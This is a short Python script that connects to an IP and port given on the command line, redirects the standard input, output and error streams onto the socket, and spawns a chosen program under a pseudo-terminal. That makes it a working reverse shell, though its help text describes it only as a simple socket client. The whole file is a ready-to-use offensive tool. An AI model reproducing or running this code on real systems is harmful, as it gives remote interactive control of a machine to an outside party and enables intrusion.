#!/usr/bin/env python3
import os,sys, socket, pty


def main():
	if not len(sys.argv) == 4:
		print("Simple socket-based client; connect and serve an arbitrary program")
		print("USAGE: ./%s <prog> <ip> <port>" % sys.argv[0])
		sys.exit()
	self,prog,ip,port = sys.argv
	sx = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sx.connect((ip,int(port)))
	os.dup2(sx.fileno(),2)
	os.dup2(sx.fileno(),1)
	os.dup2(sx.fileno(),0)
	try:
		pty.spawn("%s" % prog)
	except:
		sx.close()
	sx.close()

if __name__=="__main__":
	main()
